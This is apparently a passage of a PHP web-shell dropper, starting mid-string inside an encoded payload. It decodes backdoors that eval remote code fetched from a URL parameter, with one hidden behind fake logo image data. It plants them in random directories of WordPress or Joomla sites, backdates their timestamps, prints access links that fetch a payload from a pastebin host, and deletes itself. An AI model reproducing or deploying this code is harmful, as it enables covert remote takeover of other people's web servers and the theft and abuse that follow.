WDFORlVsWkZVbHNuVWtWTlQxUkZYMEZFUkZJblhTNGlJaWs3RFFvSmZRMEtjbVYwZFhKdUlDUjFjbXhmWjJWMFgyTnZiblJsYm5SelgyUmhkR0U3RFFwOURRb2tZU0E5SUhWeWJGOW5aWFJmWTI5dWRHVnVkSE1vSkY5SFJWUmJKM1Z5YkNkZEtUc05DbVYyWVd3b0p6OCNKeTRrWVNrNyI+JztwcmVnX21hdGNoKCcjPGltZyBzcmM9ImRhdGE6aW1hZ2UvcG5nOyguKikiPiMnLCR3cF9kZWZhdWx0X2xvZ28sJGxvZ29fZGF0YSk7JGxvZ29faW1hZ2U9JGxvZ29fZGF0YVsxXTskd3BhdXRvcD1wcmVfdGVybV9uYW1lKCRsb2dvX2ltYWdlKTtpZihpc3NldCgkd3BhdXRvcCkpeyRwcmVnX2ltcG9ydD0iXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg1Zlx4NjZceDc1XHg2ZVx4NjNceDc0XHg2OVx4NmZceDZlIjskcHJlZ19pbXBvcnQoJycsJ30nLiR3cGF1dG9wLicvLycpO30=';

$wp_dec_file = base64_decode($wp_code);

$jm_dec_file = base64_decode($jm_code);

$orig_dir = getcwd();

$counter = 0;
do{
  foreach(glob("*") as $file) {
    if(strpos($file, ".html") !== false) {
      define('PLATFORM', 'WORDPRESS');
    }
    else {
      define('PLATFORM', 'JOOMLA');
    }
  }
  if(!defined('PLATFORM')) {
    $counter++;
  }
  else {
    $site_root_dir = $server;
  }
}while(!defined('PLATFORM') && $counter < MAX_LEVELS_UP);

if(!defined('PLATFORM')) {
  define('PLATFORM', 'JOOMLA');
}

$all_dirs = array();

get_all_dirs($server);

//$all_dirs = array_filter($all_dirs, "filter_dirs");

if(count($all_dirs) >= 2) {
  $num_of_rand_dirs = 2;
}
else {
  $num_of_rand_dirs = count($all_dirs);
}

if($num_of_rand_dirs > count($all_dirs)) {
  $num_of_rand_dirs = count($all_dirs);
}

$chosen_dirs_indexes = array_rand($all_dirs, $num_of_rand_dirs);

print "PLATFORM : " . PLATFORM . "<br>\n";

if(PLATFORM == 'WORDPRESS') {
  $contents = array($wp_dec_file);
}

else {
  $contents = array($jm_dec_file);
}

$web_dirname = dirname($_SERVER['REQUEST_URI']);
$site_root_dir_splitted = explode("/", $site_root_dir);
$web_dir_splitted = explode("/", $web_dirname);

if($site_root_dir_splitted[count($site_root_dir_splitted)-1] == $web_dir_splitted[1]) {
  $site_dir = $web_dir_splitted[1];
}

$content_type = 0;
foreach($chosen_dirs_indexes as $chosen_dir_index) {
  if((time() - $start_time) > MAX_EXEC_TIME) {
    exit;
  }

  $file_name = get_file_name($all_dirs[$chosen_dir_index] . '/');
  file_put_contents($file_name, $contents[$content_type]);
  touch($file_name, time() - rand(60*60*24, 60*60*24*800));
  $file_rel_path = substr($file_name, strlen($site_root_dir));
  if(!isset($site_dir)) {
    $site_dir = '';
  }
  $file_full_path = $site_dir . $file_rel_path;
  if($content_type == 0) {
    $content_type = 0;
  }
  else {
    $content_type = 0;
  }
  print "path:" . preg_replace("/^\//", "",$file_full_path) . "?url=http%3A%2F%2Fpastebin.hotwebber.dk%2Fview%2Fraw%2F26c0b46e<br></pathShell>";
  flush();
  unlink(basename($_SERVER['PHP_SELF']));
}
unlink(basename($_SERVER['PHP_SELF']));
unlink('shd.php');
@unlink(__FILE__);
?>